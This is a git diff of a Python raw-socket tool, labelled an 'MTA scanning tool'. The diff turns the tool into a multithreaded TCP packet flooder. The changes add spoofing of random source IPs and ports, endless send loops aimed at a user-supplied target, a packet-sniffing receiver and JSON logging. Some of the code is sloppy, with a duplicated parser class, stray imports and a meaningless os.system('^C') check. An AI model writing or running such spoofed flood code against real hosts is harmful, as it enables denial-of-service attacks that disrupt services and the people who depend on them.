@@ -1,3 +1,4 @@
+from json.tool import main
 from socket import *
 from struct import *
 import sys
@@ -7,9 +8,14 @@ import threading
 from queue import Queue
 import os
 import json
+import random
+import struct
+from turtle import delay
+from datetime import datetime
+
 
 class FloodPacketAssembler:
-    def __init__(self, src_ip, dest_ip, dest_port):
+    def __init__(self, src_ip, dest_ip, source_port , dest_port):
         #packet
         self.ip_final_header = b""
         self.tcp_header = b""
@@ -52,7 +58,7 @@ class FloodPacketAssembler:
 
 
         # tcp header fields
-        self.tcp_src_port = 1234
+        self.tcp_src_port = source_port
         self.tcp_dst_port = dest_port
         self.tcp_seq_bytenum = 0
         self.tcp_ack_bytenum = 0
@@ -157,17 +163,67 @@ class IpTcpParser:
 
                 self.rwnd = self.tcp_h_unp[6] 
 
-def Json_Parse(port, service, state, victim_ip, attack_ip, fin, syn, rst, ack):
+class IpTcpParser:
+    def __init__(self, raw_data):
+        # parse ethernet header
+        self.eth_length = 14
+        self.eth_header_pack = raw_data[:self.eth_length]
+        self.eth_h_unp = unpack('! 6s 6s H', self.eth_header_pack)
+        # EtherType, to indicate which protocol is encapsulated in the payload of the frame
+        self.eth_protocol = self.eth_h_unp[2]
+
+        # Parse IPv4 packets, IPv4 Protocol number = 0x0800
+        if self.eth_protocol == 0x0800:
+            # Parse IPv4 header
+            # take first 20 characters for the ipv4 header
+            self.ipv4_header_pack = raw_data[self.eth_length: self.eth_length + 20]
+            self.ipv4_h_unp = unpack('! B B H H H B B H 4s 4s', self.ipv4_header_pack)
+
+            self.version_ihl = self.ipv4_h_unp[0]
+            self.ihl32 = self.version_ihl & 0xF  # 4 bits that specify the size of the IPv4 header (the number of 32-bit words in the header)
+            self.ipv4_h_length = self.ihl32 * 4  # the size of the IPv4 header (in Bytes)
+            self.header_offset_ip = self.ipv4_h_length + self.eth_length
+
+            self.trans_protocol = self.ipv4_h_unp[6]  # the protocol used in the data portion of the IP datagram.
+
+            self.rc_src_ip = inet_ntoa(self.ipv4_h_unp[8])
+            # print("1 "+str(self.ipv4_h_unp[8]))
+            # print("rc_src_ip: "+str(self.rc_src_ip))
+            self.rc_dst_ip = inet_ntoa(self.ipv4_h_unp[9]) 
+            # print("rc_dst_ip: "+str(self.rc_dst_ip))
+            # Parse TCP Packets, TCP Protocol Number = 6
+            # print("TCP trans protocol: " + str(self.trans_protocol))
+            if self.trans_protocol == 6:
+                self.tcp_header_pack = raw_data[self.header_offset_ip: self.header_offset_ip + 20]
+                self.tcp_h_unp = unpack('! H H L L B B H H H', self.tcp_header_pack)
+
+                self.rc_src_port = self.tcp_h_unp[0]
+                self.rc_dst_port = self.tcp_h_unp[1]
+
+                self.rc_tcp_flags = self.tcp_h_unp[5]
+                self.cwr = self.rc_tcp_flags >> 7 &0x01
+                self.ece = (self.rc_tcp_flags >> 6) & 0x01
+                self.urg = (self.rc_tcp_flags >> 5) & 0x01
+                self.ack = (self.rc_tcp_flags >> 4) & 0x01
+                self.psh = (self.rc_tcp_flags >> 3) & 0x01
+                self.rst = (self.rc_tcp_flags >> 2) & 0x01
+                self.syn = (self.rc_tcp_flags >> 1) & 0x01
+                self.fin = self.rc_tcp_flags & 0x01
+
+                self.rwnd = self.tcp_h_unp[6]
+
+def Json_Parse(id,src_ip, dst_ip, src_port, dst_port, fin, syn, rst, ack,type):
     object = {}
-    object["port"] = port
-    object["service"] = service
-    object["state"] = state
-    object["victim_ip"] = victim_ip
-    object["attack_ip"] = attack_ip
+    object["id"] = id
+    object["src_ip"] = src_ip
+    object["dst_ip"] = dst_ip
+    object["src_port"] = src_port
+    object["dst_port"] = dst_port
     object["fin"] = fin
     object["syn"] = syn
     object["rst"] = rst
     object["ack"] = ack
+    object["type"] = type
     # json_object = json.dumps(object)
     # print(json_object)
     return object
@@ -176,21 +232,90 @@ def write_json(data, filename):
     cur_path = os.path.dirname(__file__)
     new_path = os.path.join(cur_path, '..', 'log', filename)
     # data = "["+ data + "]"
-    print(data)
+    print("Save successful !!! \n")
     with open(new_path,"w") as f:
-        json.dump(data,f)
+        json.dump(data,f, indent=2)
 
 
-def threader_sender(json_vars):
+def threader_sender(json_vars,x):
     a = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)
     a.setsockopt(IPPROTO_IP, IP_HDRINCL, 1)
     while True:
+        src_ip, src_port = Get_Random_Host()
         # now start constructing the packet
-        myscan = FloodPacketAssembler(src_ip, dst_ip, port)
-
+        myflood = FloodPacketAssembler(src_ip, dst_ip, src_port , dst_port)
+        json_vars.append(Json_Parse(x,src_ip,dst_ip, myflood.tcp_src_port, myflood.tcp_dst_port, myflood.tcp_fin, myflood.tcp_syn, myflood.tcp_rst, myflood.tcp_ack,"request"))
         # Send the packet finally - the port specified has no effect
-        a.sendto(myscan.packet, (dst_ip, port))  # put this in a loop if you want to flood the target
+        a.sendto(myflood.packet, (dst_ip, dst_port))  # put this in a loop if you want to flood the target
+        # print(json_vars)
         time.sleep(int(processing_delay))
+        if(os.system("^C")):
+            print("------------------------")
+            break
+
+def threader_receiver(json_vars):
+    # create a AF_PACKET type raw socket (thats basically packet level)
+    # define ETH_P_ALL    0x0003    Every packet
+    s = socket(AF_PACKET, SOCK_RAW, ntohs(3))
+    
+    # infinite loop to receive packets
+    while True:
+        raw_data, addr = s.recvfrom(65535)
+        myreceive = IpTcpParser(raw_data)
+        
+        # if (myreceive.eth_protocol == 0x0800) and (str(myreceive.rc_src_ip) == str(dst_ip)) and (myreceive.trans_protocol == 6) :
+        #     json_vars.append(Json_Parse(myreceive.rc_src_ip, myreceive.rc_dst_ip, myreceive.rc_src_port, myreceive.rc_dst_port, myreceive.fin, myreceive.syn,myreceive.rst, myreceive.ack,"response"))
+            
 
 def UserInput():
-    
+    parser = argparse.ArgumentParser("MTA SCANNING TOOL")
+    parser.add_argument("--dstIp", help="Specify target IP", required=False)
+    parser.add_argument("--dstPort", type=int, required=False)
+    parser.add_argument("--delay", type=int,help="Processing Delay", required=False)
+    parser.add_argument("--thread", type=int,help="Number of thread", required=False)
+    args = parser.parse_args()
+
+    try:
+        dst_ip = args.dstIp
+    except (UnboundLocalError, gaierror):
+        print("\n[-]Destination Error\n")       
+    try:
+        dst_port = args.dstPort
+    except (UnboundLocalError, gaierror):
+        print("\n[-]Destination Error\n") 
+    try:
+        processing_delay = args.delay
+    except (UnboundLocalError, gaierror):
+        print("\n[-]Delay Error\n") 
+    try:
+        num_threads = args.thread
+    except (UnboundLocalError, gaierror):
+        print("\n[-]Thread Error\n") 
+
+    return dst_ip,dst_port, processing_delay, num_threads
+
+def Get_Random_Host():
+    src_ip = inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))
+    sock = socket()
+    sock.bind(('', 0))
+    src_port = sock.getsockname()[1]
+    return src_ip, src_port
+
+
+
+if __name__ == '__main__':
+    dst_ip ,dst_port, processing_delay, num_threads = UserInput() 
+    json_vars = []
+
+    # 1 thread for receiving
+    tr = threading.Thread(target=threader_receiver, daemon=True, args=(json_vars,))  # classifying as a daemon, so they will die when the main dies
+    tr.start()
+
+
+    for x in range(num_threads):
+        ts = threading.Thread(target=threader_sender, daemon=True, args=(json_vars,x))  # classifying as a daemon, so they will die when the main dies
+        ts.start()
+
+    current_time = datetime.now().strftime("%H:%M_%m-%d-%Y")
+    write_json(json_vars,"flood_"+current_time+".json")
+    write_json(json_vars, "flood_temp.json")
